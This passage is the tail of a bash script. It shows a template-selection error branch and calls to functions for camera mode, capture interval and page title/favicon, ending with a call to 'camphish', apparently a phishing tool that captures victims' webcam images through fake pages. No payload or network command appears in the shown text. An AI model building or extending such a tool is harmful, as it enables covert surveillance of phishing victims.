printf ""
else
printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
sleep 1
select_template
fi
select_camera_mode
select_capture_interval
get_custom_title_favicon
fi
}

banner
dependencies
camphish
